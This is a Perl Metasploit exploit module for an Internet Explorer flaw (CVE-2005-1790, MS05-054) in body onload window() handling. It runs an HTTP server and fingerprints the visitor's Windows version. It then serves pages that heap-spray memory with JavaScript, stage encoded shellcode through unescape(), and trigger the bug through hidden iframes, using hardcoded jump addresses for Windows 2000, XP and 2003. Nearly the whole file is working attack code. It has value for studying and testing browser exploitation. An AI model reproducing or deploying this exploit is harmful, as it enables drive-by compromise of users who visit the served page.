##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::ie_js_window;

use strict;
use base "Msf::Exploit";
use Pex::Text;
use IO::Socket::INET;
use  POSIX;

my $advanced =
  {
  };

my $info =
  {
	'Name'           => 'Internet Explorer javascript Window',
	'Version'        => '$Revision$',
	'Authors'        =>
	  [
		'<justfriends4n0w [at] yahoo.com>'
	  ],

	'Description'    =>
	  Pex::Text::Freeform(qq{
		This module exploits a vulnerability in Internet Explorer's
		parsing of the <body onload= [javascript function>.  
		See http://www.computerterrorism.com/research/ie/ct21-11-2005

}),

	'Arch'           => [ 'x86' ],
	'OS'             => [ 'win32', 'winxp', 'win2003' ],
	'Priv'           => 0,

	'UserOpts'       =>
	  {
		'HTTPPORT' => [ 1, 'PORT', 'The local HTTP listener port', 8080      ],
		'HTTPHOST' => [ 0, 'HOST', 'The local HTTP listener host', "0.0.0.0" ],
	  },

	'Payload'        =>
	  {
		'Space'    => 1000,
		'MaxNops'  => 0,
		'Keys'     => [ '-ws2ord', '-bind' ],
	  },

	'Refs'           =>
	  [
	  	[ 'MSB', 'MS05-054'],
	  	[ 'BID', '13799' ],
		[ 'CVE', '2005-1790' ],

	  ],

	'DefaultTarget'  => 0,
	'Targets'        =>
	  [
		[ 'Automatic - Windows 2000, Windows XP' ]
	  ],

	'Keys'           => [ 'ie' ],

	'DisclosureDate' => '21 Nov 2005',
  };

sub new
{
	my $class = shift;
	my $self;

	$self = $class->SUPER::new(
		{
			'Info'     => $info,
			'Advanced' => $advanced,
		},
		@_);

	return $self;
}

sub JSUnescape # Taken from Mozilla_Compareto by Aviv Raff and H D Moore
{
	my $self = shift;
	my $data = shift;
	my $code = '';

	# Encode the shellcode via %u sequences for JS's unescape() function
	my $idx = 0;
	while ($idx < length($data) - 1) {
		my $c1 = ord(substr($data, $idx, 1));
		my $c2 = ord(substr($data, $idx+1, 1));
		$code .= sprintf('%%u%.2x%.2x', $c2, $c1);
		$idx += 2;
	}

	return $code;
}

sub Exploit
{
	my $self = shift;
	my $server = IO::Socket::INET->new(
		LocalHost => $self->GetVar('HTTPHOST'),
		LocalPort => $self->GetVar('HTTPPORT'),
		ReuseAddr => 1,
		Listen    => 1,
		Proto     => 'tcp');
	my $client;

	# Did the listener create fail?
	if (not defined($server))
	{
		$self->PrintLine("[-] Failed to create local HTTP listener on " . $self->GetVar('HTTPPORT'));
		return;
	}

	$self->PrintLine("[*] Waiting for connections to http://" . $self->GetVar('HTTPHOST') . ":" . $self->GetVar('HTTPPORT') . " ...");

	while (defined($client = $server->accept()))
	{
		$self->HandleHttpClient(fd => Msf::Socket::Tcp->new_from_socket($client));
	}

	return;
}

sub HandleHttpClient
{
	my $self = shift;
	my ($fd) = @{{@_}}{qw/fd/};
	my $targetIdx = $self->GetVar('TARGET');
	my $target    = $self->Targets->[$targetIdx];
	my $ret       = $target->[1];
	my $shellcode = $self->GetVar('EncodedPayload')->Payload;
	my $scsize=(length($shellcode)/2) +9;
	$shellcode   = $self->JSUnescape($shellcode);

	$scsize=sprintf("%X", $scsize);

	my $content;
	my $rhost;
	my $rport;

	my $targets =
	  {
		"Windows 2000" => [ 0x777e85ab, 0x7ffdec50 ], # samlib jmp esp ALL
		"Windows XP"   => [ 0x71ab1d54, 0x7ffdec50 ], # ws2_32 push esp/ret SP0/1
		"Windows 2003" => [ 0x77d1f92f, 0x7ffdec50 ]  # user32 jmp esp SP0/1
	  };
	  
	my $target;
	my $os;

	# Read the HTTP command
	my ($cmd, $url, $proto) = split / /, $fd->RecvLine(10);

	# Read in the HTTP headers
	while (my $line = $fd->RecvLine(10))
	{
		my ($var, $val) = split /: /, $line;

		# Break out if we reach the end of the headers
		last if (not defined($var) or not defined($val));

		if ($var eq 'User-Agent')
		{
			$os = "Windows 2003" if (!$os and $val =~ /Windows NT 5.2/);
			$os = "Windows XP"   if (!$os and $val =~ /Windows NT 5.1/);
			$os = "Windows 2000" if (!$os and $val =~ /Windows NT 5.0/);
			$os = "Windows NT"   if (!$os and $val =~ /Windows NT/);
			$os = "Unknown"      if (!$os);
		}
	}

	# Set the remote host information
	($rport, $rhost) = ($fd->PeerPort, $fd->PeerAddr);

	$target = $targets->{$os};

	if (! $target) {
		$self->PrintLine("[*] Unsupported HTTP Client connected from $rhost:$rport using $os");
		$fd->Close;
		return;
	}

	# Build the HTML
	if (defined($target))
	{

		if($url =~ /bug.html/)
		{
			$self->PrintLine("[*] Sending bug.html ...");

			$content="<body onload=\"setTimeout('main()',10000)\">  \n<script>function main()\n" .
			  "{ document.write(\"<body onload=window();>\") \n" .
			  "window.location.reload()\n" .
			  "\n}" .
			  "</SCRIPT>";

		}
		elsif ($url =~ /bug2k.html/)
		{
			$self->PrintLine("[*] Sending bug2k.html ...");
			$content="<body onload=\"setTimeout('main()',20000)\">  \n<script>function main()\n" .
			  "{ document.write(\"<body onload=window();>\") \n" .
			  "window.location.reload()\n" .
			  "\n}" .
			  "</SCRIPT>";

		}
		elsif ($url =~ /fillmem.html/)
		{
			$self->PrintLine("[*] Sending fillmem.html ...");

			#$self->PrintLine("[*] scsize: $scsize");

			#$enc=~ s/\r/\\r/g;

			my $enc='<HTML>\r<HEAD>\r<Script Language="JavaScript">\rfunction load() \r{\r\rvar spearson=0\rvar eip = ""\rvar prep_shellcode = ""\rvar shellcode = ""\rvar fillmem = ""\r\r\r//\r// Address called by the bug (also serves as slide code)\r//\rfor (spearson=1 ; spearson <=500 ; spearson++)' .
			  '\r{ \reip = eip' .
			  ' + unescape("%u7030%u4300")' .
			  '\r//eip = eip + unescape("%u4300")\r}\r\r\r'.
			  '\r// Create a large chunk for memory saturation\r//' .
			  '\rfor (spearson=1 ; spearson <=200; spearson++)' .
			  '\r{ \rfillmem = fillmem + eip\r}\r\r//\r// ' .
			  'Search for our shellcode (tagged with my initials) and copy to a more stable area' .
			  '\r//\rprep_shellcode = ' .
			  'unescape("%u9090%uBA90%u4357%u4357%uF281%u1111%u1111%u4190" ' .
			  '+\r"%u1139%uFA75%u9090%uF18B%uF88B%u9057%uc933%ub966" ' .
			  '+\r' .
			  '"%u00'

			  #.'A5' .
			  . $scsize .
			  '%ua5F3%u9090%u905f%ue7ff")' .
			  '\r\r' .
			  '\rmyshellcode = unescape(\r"' .
			  '%u5246%u5246' .
			  '%u9090' .
			  $shellcode .
			  '"' .
			  ');\r\r ' .

			  '\rshellcode=myshellcode\r// from http://www.elitesecurity.org/tema/80431\r \r \rfillmem = fillmem + prep_shellcode' .
			  ' + shellcode\r \rprompt(fillmem,"hello world")\r\r}\r// -->\r</Script> \r</head>\r<TITLE>Windows Explorer Exploit' .
			  '</TITLE>\r<body onload="setTimeout(\'load()\',2000)">\r\rtest test test\r</body>\r</html>\r\r\r';

			$enc=~ s/\\r/\r/g;

			$content=$enc;

		}

		elsif($os eq "Windows XP")
		{
			$self->PrintLine("[*] Sending exploit page for Windows XP...");
			$content="<HTML><TITLE>Hello</Title>\n";
			for(my $i=0; $i<8; $i++) {$content=$content. "<iframe width=1 height=1 border=0 frameborder=0 src=fillmem.html>\n";}
			$content= $content . "<iframe width=1 height=1 border=0 frameborder=0 src=bug.html>\n</iframe>";

		}
		elsif($os eq "Windows 2000")
		{
			$self->PrintLine("[*] Sending exploit page for Windows 2000 ...");

			$content="<HTML><TITLE>Hello</Title>\n";
			for(my $i=0; $i<8; $i++) {$content=$content. "<iframe width=1 height=1 border=0 frameborder=0 src=fillmem.html>\n";}
			$content= $content . "<iframe width=1 height=1 border=0 frameborder=0 src=bug2k.html>\n</iframe>";

		}

	}

	$self->PrintLine("[*] HTTP Client connected from $rhost:$rport using $os, sending payload...");

	# Transmit the HTTP response
	$fd->Send(
		"HTTP/1.1 200 OK\r\n" .
		  "Content-Type: text/html\r\n" .
		  "Content-Length: " . length($content) . "\r\n" .
		  "Connection: close\r\n" .
		  "\r\n" .
		  "$content"
	  );

	$fd->Close();
}

1;
